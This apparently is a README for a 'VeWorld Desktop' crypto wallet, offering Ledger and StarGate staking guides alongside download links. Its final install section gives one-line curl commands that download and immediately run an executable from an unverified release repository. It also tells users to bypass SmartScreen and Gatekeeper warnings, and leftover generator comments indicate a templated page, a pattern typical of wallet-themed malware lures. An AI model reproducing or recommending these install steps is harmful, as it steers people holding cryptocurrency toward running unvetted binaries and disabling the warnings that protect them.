![VeWorld Desktop](assets/banner-hub.png)

# VeWorld Desktop hardware and staking

Ledger pairing, detection failures, device safety, and StarGate positions that actually earn.

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4"><img src="assets/badge-release.svg" alt="Release v2.2.4"></a></p>

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

> A paired Ledger signs only after a physical confirmation, so read the destination and amount on the device screen.

## What this repository is for
This repository covers the two subjects that most often send a VeChain wallet owner looking for help after the wallet itself is working: a Ledger that will not connect or will not sign, and a staking position that matures and then produces nothing. Both are configuration problems far more often than they are faults.

Detection failures are almost always outside the wallet: a cable that carries power and no data, a hub the device cannot enumerate through, a device sitting in another coin application, or a second program holding the device open. Each has a cheap test, and the guides put the cheapest first so a reader does not reinstall anything to fix a cable.

Two devices in one wallet is the setup people ask about more often than they expect to need. A Ledger's addresses derive from the phrase inside it, so two devices produce two independent sets of accounts and the wallet simply lists both. That is useful for separating a long-term holding from a working balance, and it is also why a signature request has to match the device you meant: the address on screen is the only way to tell them apart.

Staking failures are the same shape. A position mints as an NFT, matures over a period set by its tier, and earns nothing until it is delegated to an active validator; a delegated position must leave delegation before it can be unstaked, and the unbonding completes at the end of the validator's cycle. Understanding that sequence explains almost every 'my rewards are missing' report, and it explains why an idle balance stopped producing VTHO when the network changed.

## Who it is for
- People pairing a Ledger with a VeChain wallet for the first time.
- Readers whose device is detected by the operating system but not by the wallet.
- Anyone holding a Ledger and wondering what the 2026 losses did and did not involve.
- VET holders who want a position that accrues VTHO rather than an idle balance.

## Start here
- [pair a Ledger](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md) - Three things have to be true before a signature: a data cable, the VeChain app, and an account added.
- [a Ledger that is not detected](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-sync-not-detected-veworld-desktop.md) - Work through cable, port, coin app and competing software in that order before doubting the wallet.
- [staking VET through StarGate](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-stargate-staking-in-veworld-desktop.md) - Stake VET, wait out maturity, delegate to an active validator, and expect the exit to take a cycle.
- [reading a staking reward](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-staking-rewards-figure-veworld-desktop.md) - An estimate, an accrual and a total look similar on screen, and reading one as another causes most confusion.

## How to use these guides
1. Connect the device with a cable you know carries data, directly to the machine.
2. Unlock it, open the VeChain app, and leave it on screen before starting the wallet flow.
3. Add the account, confirm the address on the device, then sign a small test transaction.
4. For staking, meet a tier minimum, wait out maturity, then delegate to an active validator.
5. Read the position after a full cycle rather than after a day before judging the result.
6. If a signature request appears with no matching action, reject it on the device and close the session.

## The guides

- [pair a Ledger](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md) - Three things have to be true before a signature: a data cable, the VeChain app, and an account added.
- [a Ledger that is not detected](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-sync-not-detected-veworld-desktop.md) - Work through cable, port, coin app and competing software in that order before doubting the wallet.
- [two devices in one wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/two-vechain-ledger-wallets-veworld-desktop.md) - Each device signs only for the addresses its own phrase derived, so two devices stay independent.
- [how a Ledger can still lose funds](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md) - The ways funds leave a hardware wallet, and which of them a secure element cannot prevent.
- [Ledger safety after 2026](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/is-ledger-safe-after-2026-veworld-desktop.md) - What the 2026 losses did and did not involve, and why a device that only signs what you read is still useful.
- [an older Nano S with VeChain](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-nano-s-in-veworld-desktop.md) - Compatibility with an older device is a test you run, not a promise anyone can make for you.
- [Ledger Live or the wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-live-vs-veworld-desktop.md) - One application manages the device; the other does the chain work. Neither holds the keys.
- [settings changed mid-signing](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-app-settings-veworld-desktop.md) - A setting changed during a signing flow leaves the payload stale, and the device refuses rather than guesses.
- [staking VET through StarGate](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-stargate-staking-in-veworld-desktop.md) - Stake VET, wait out maturity, delegate to an active validator, and expect the exit to take a cycle.
- [reading a staking reward](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-staking-rewards-figure-veworld-desktop.md) - An estimate, an accrual and a total look similar on screen, and reading one as another causes most confusion.
- [the old node reward](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-node-rewards-old-node-veworld-desktop.md) - Issuance moved to StarGate; an older programme's claim action did not follow it into this wallet.

## What each guide changes
| Task | Guide | Outcome |
| --- | --- | --- |
| Get a first signature | [pair a Ledger](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md) | A device that signs, with the address confirmed on screen |
| Fix a detection failure | [a Ledger that is not detected](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-sync-not-detected-veworld-desktop.md) | Cable, port and coin app excluded in order |
| Run two devices | [two devices in one wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/two-vechain-ledger-wallets-veworld-desktop.md) | Two independent sets of addresses in one wallet |
| Open a staking position | [staking VET through StarGate](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-stargate-staking-in-veworld-desktop.md) | A position matured, delegated and observed |
| Read a reward figure | [reading a staking reward](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-staking-rewards-figure-veworld-desktop.md) | An estimate told apart from an accrual |
| Understand device risk | [how a Ledger can still lose funds](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md) | The losses a secure element cannot prevent |

## Common first questions

### Does the wallet ever see the device's keys?
No. The device signs internally and returns a signature, which is why a compromised computer cannot move funds on its own.

### Why does a device that works elsewhere fail here?
Usually because another program holds it open, or because the VeChain app is not the one on screen. Both are connection-level problems rather than wallet faults.

### Why did my matured position earn nothing?
Because maturity only makes a position eligible. Delegation to an active validator is the step that makes it accrue, and it is the step most often missed.

### Does pairing a Ledger change the wallet's address?
No. The device's accounts derive from its own phrase and are added alongside whatever the software wallet already held, so the two sets stay separate.

### Can I stake from a Ledger account?
The staking flow builds a transaction the device must sign, so the position belongs to that device's address. Confirm the position NFT sits on the address you expect before delegating.

### Can I unstake immediately?
A delegated position has to leave delegation first, and the unstake completes at the end of the validator's cycle. A position that was never delegated can be unstaked at any time.

### What happens if the device is lost?
The funds stay on the chain, because the device is only a signer. A replacement loaded with the same recovery phrase reproduces the addresses, which is why the phrase is the item to protect.


## Before you install
- A data-capable cable reserved for the device, kept apart from charging cables.
- The device firmware checked on the device itself, not in a browser tab.
- The recovery phrase written down before any firmware update, because updates are the riskiest routine operation.
- A small test transaction planned before moving a large balance.
- The addresses you expect to see, read from the device itself before the first signature.

## About and license
VeWorld Desktop hardware and staking is part of the VeWorld Desktop pack: guides for a self-custody wallet on the VeChainThor network, published for Windows, macOS and Linux. The application is actively maintained and each release ships with its notes and checksums. This repository carries no licence file, so none is claimed here.


## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->